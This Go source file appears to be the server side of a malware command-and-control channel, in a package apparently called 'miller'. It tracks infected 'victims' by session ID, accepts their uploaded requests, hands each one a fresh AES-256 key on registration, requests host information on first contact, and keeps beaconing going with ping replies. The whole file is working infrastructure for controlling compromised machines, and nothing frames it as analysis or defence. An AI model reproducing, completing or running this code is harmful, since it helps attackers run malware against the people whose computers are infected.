package main

import (
    "../cnclib"
    "github.com/gorilla/mux"

    "fmt"
    "log"
    "io"
    "net/http"
    "encoding/binary"
    "encoding/hex"
    "crypto/rand"
    "bytes"
)


func miller_to_master(v *miller.Victim, url *string) error {
    _, err := v.ToJSON(false)
    if err != nil {
        return err
    }
    return nil
}

func miller_http_request(v *miller.Victim, r *http.Request) (bool, error) {
    var valid bool
    var req miller.HttpResp
    var err error
    read_form, err := r.MultipartReader()
    if err != nil {
        return false, err
    }

    for {
        part, err := read_form.NextPart()
        if err == io.EOF {
            break
        }

        if part.FormName() == "upload" {
            buf := new(bytes.Buffer)
            buf.ReadFrom(part)
            if verbose {
                log.Printf("Request (upload; %d bytes):\n%s", len(buf.String()), hex.Dump(buf.Bytes()))
            }
            err = v.ParseRequest(buf.Bytes(), &req)
            if err != nil {
                return false, err
            }
            if verbose {
                log.Printf("HTTP REQUEST(%v)", &req)
            }
            valid = true
        }
    }

    if !valid {
        return false, nil
    }
    return true, nil
}

func miller_randbytes(n int) ([]byte, error) {
    b := make([]byte, n)
    _, err := rand.Read(b)
    if err != nil {
       return nil, err
   }

   return b, nil
}

func miller_state_machine(v *miller.Victim, marker *string) ([]byte, error) {
    var err error
    var buffer []byte
    var resp miller.HttpResp

    err = miller.ParseMarkerResponse(&resp, []byte(*marker))
    if err != nil {
        return nil, err
    }

    log.Printf("Miller state machine got a '%s'", miller.RCtoString(v.Last_rc_rx))
    switch v.Last_rc_rx {
        case miller.RC_REGISTER:
            resp.RespFlags = miller.RF_OK
            resp.RespCode = miller.RC_REGISTER
            resp_reg, err := NewRegisterResponse(5, v)
            if err != nil {
                return nil, err
            }
            buffer, err = v.BuildRegisterResponse(&resp, resp_reg, buffer)
            if err != nil {
                return nil, err
            }
            if v.Last_rf_rx == miller.RF_INITIAL && v.Requests == 1 {
                log.Printf("FIRST CONTACT: Grabbing some information !!")
                resp.RespFlags = miller.RF_AGAIN
                resp.RespCode = miller.RC_INFO
                buffer, err = v.BuildInfoResponse(&resp, buffer)
            }
        break
        case miller.RC_INFO:
            resp.RespFlags = miller.RF_OK
            resp.RespCode = miller.RC_PING
            resp_pong := NewPongResponse(5)
            buffer, err = v.BuildPongResponse(&resp, &resp_pong, buffer)
            if err != nil {
                return nil, err
            }
        break
        case miller.RC_PING:
            resp.RespFlags = miller.RF_OK
            resp.RespCode = miller.RC_PING
            resp_pong := NewPongResponse(5)
            buffer, err = v.BuildPongResponse(&resp, &resp_pong, buffer)
            if err != nil {
                return nil, err
            }
        break
        default:
            return nil, fmt.Errorf("invalid response code 0x%04X", v.Last_rc_rx)
    }

    return buffer, nil
}

func miller_http_handler(w http.ResponseWriter, r *http.Request) {
    params := mux.Vars(r)
    sid, ok := params["sid"]
    if !ok {
        return
    }
    marker, ok := params["marker"]
    if !ok {
        return
    }
    rnd, ok := params["rnd"]
    if !ok {
        return
    }

    fake_resp := miller.HttpResp{}
    if r.ContentLength < int64(binary.Size(fake_resp)) {
        log.Printf("Fake response has invalid size.")
        http.NotFound(w, r)
        return
    }

    if verbose {
        log.Printf("---------- %s ----------", "REQUEST")
    }
    log.Printf("SID '%s' with MARKER '%s' and RND '%s'", sid, marker, rnd)

    var err error
    var v *miller.Victim
    v = mgr.GetVictim(&sid)
    if v == nil {
        v = miller.NewVictim()
        mgr.SetVictim(v, &sid)
    }
    if !mgr.PushVictim(&sid) {
        log.Printf("ERROR Victim is already known to the Manager!")
        http.NotFound(w, r)
        return
    }

    valid, err := miller_http_request(v, r)
    if err != nil {
        log.Printf("ERROR miller_http_request: '%s'", err)
    }
    if !valid {
        log.Printf("ERROR Victim HTTP Request was invalid!")
        http.NotFound(w, r)
        return
    }

    buffer, err := miller_state_machine(v, &marker)
    if err != nil {
        log.Printf("ERROR miller_state_machine: '%s'", err)
    }
    if buffer == nil {
        log.Printf("ERROR binary buffer was empty after miller_state_machine")
        http.NotFound(w, r)
        return
    }

    if v.Last_rc_rx == miller.RC_REGISTER && v.Requests > 1 {
        log.Printf("WARNING: Victim '%s' RE-REGISTERED !!", sid)
    }

    if verbose {
        log.Printf("Response (%d bytes):\n%s", len(buffer), hex.Dump(buffer))
        log.Printf("VICTIM STATE(%s)", v)
        json_out, err := v.ToJSON(true)
        if err == nil {
            log.Printf("VICTIM JSON(%s)", string(json_out))
        }
        log.Printf("---------- %s ----------", "EoF REQUEST/RESPONSE")
    }

    mgr.PopVictim(&sid)

    w.Write(buffer)
}

func NewRegisterResponse(next_ping uint32, victim *miller.Victim) (*miller.RespRegister, error) {
    respreg := miller.RespRegister{ [miller.AESKEY_SIZ]byte{}, next_ping }
    aeskey, err := miller_randbytes(int(miller.KEY_256))
    if err != nil {
        return nil, err
    }
    err = miller.ParseAESKeyResponse(&respreg, aeskey)
    if err != nil {
        return nil, err
    }
    victim.SetAESKey(aeskey)
    return &respreg, nil
}

func NewPongResponse(next_ping uint32) miller.RespPong {
    return miller.RespPong{ next_ping }
}
